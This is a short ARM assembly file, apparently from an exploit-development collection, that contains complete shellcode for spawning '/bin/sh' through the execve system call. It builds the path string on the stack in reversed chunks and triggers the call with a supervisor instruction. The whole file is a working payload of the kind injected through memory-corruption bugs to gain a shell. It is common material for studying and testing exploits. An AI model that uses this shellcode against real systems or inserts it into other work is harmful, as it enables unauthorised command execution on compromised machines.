#
# ARM sys_exec("/bin/sh") shellcode
#
# @_hugsy_
#
ldr r0, ="nib/"
str r0, [sp]
ldr r0, ="hs//"
str r0, [sp, 4]
mov r0, sp
mov r1, 0
mov r2, 0
mov r7, __NR_SYS_execve
svc 0
wfi
